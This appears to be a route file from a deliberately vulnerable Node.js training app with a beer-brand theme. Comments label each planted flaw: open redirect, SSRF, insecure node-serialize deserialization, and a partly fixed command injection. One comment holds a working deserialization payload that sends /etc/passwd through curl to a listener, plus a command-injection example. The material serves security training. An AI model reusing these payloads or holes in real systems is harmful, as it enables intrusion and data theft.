'user strcit';

module.exports = (app,db) => {

    //Get System/ warehouse information
    /**
     * GET /v1/status/{brand}
     * @summary Check if brand website is available through fetch (RCE - FIXED)
     * @description command execution - brand="bud | whoami"
     * @tags system
     * @param {string} brand.path.required - the beer brand you want to test
     */
    app.get('/v1/status/:brand', async (req,res) =>{
        const fetch = require('node-fetch');
        const brand = req.params.brand;
        
        // Validate input: ensure brand is a valid hostname or URL format
        const validHost = /^[a-z0-9.-]+$/i;
        if (!validHost.test(brand) && !brand.startsWith('http')) {
            return res.status(400).send('Invalid brand');
        }

        try {
            const url = brand.startsWith('http') ? brand : `https://${brand}`;
            const r = await fetch(url, { timeout: 5000 });
            const text = await r.text();
            res.send(text);
        } catch (e) {
            console.log(e);
            res.status(500).send('Error fetching brand');
        }
    });
        //redirect user to brand
    /**
     * GET /v1/redirect/
     * @summary Redirect the user the beer brand website (Insecure redirect)
     * @Author 
     * @tags system
     * @param {string} url.query.required - the beer brand you want to redirect to
     */
     app.get('/v1/redirect/', (req,res) =>{
    var url = req.query.url
    console.log(url)
    if(url){
        res.redirect(url);
    } else{
        next()
    }
        
    });
    //initialize list of beers
    /**
     * POST /v1/init/
     * @summary Initalize beers from object (Insecure Object Deserialization)
     * @description 
            {"rce":"_$$ND_FUNC$$_function ()
            {require('child_process').exec(
            '/bin/sh -c \"cat /etc/passwd | tr \'\n\' \' \' | curl -d @- localhost:4444\"',
            function(error, stdout, stderr)
            {console.log(stdout) }
            );} () "}


            netcat -l 4444
     * @Author Insecure Object Deserialization
     * @tags system
     * @param {object} request.body.required - the beer brand you want to test
     */
     app.post('/v1/init', (req,res) =>{
        var serialize = require('node-serialize');
        const body = req.body.object;
        var deser = serialize.unserialize(body)
        console.log(deser)
        
    });
    //perform a test on an endpoint
    /**
     * GET /v1/test/
     * @summary Perform a get request on another url in the system (SSRF - Server Side Request Forgery)
     * @tags system
     * @param {string} url.query.required - the beer brand you want to redirect to
     */
     app.get('/v1/test/', (req,res) =>{
         var requests = require('axios')
        var url = req.query.url
        console.log(url)
        if(url){

            requests.get(url)
            .then(Ares => {
                //console.log(Ares);
                res.json({response:Ares.status});
                console.log(`statusCode: ${Ares.status}`);
            })
            .catch(error => {
                console.error(error);
                res.json({response:error});

            });
        } else{
            res.json({error:"No url provided"});

        }
        console.log(res)
            return
        });
};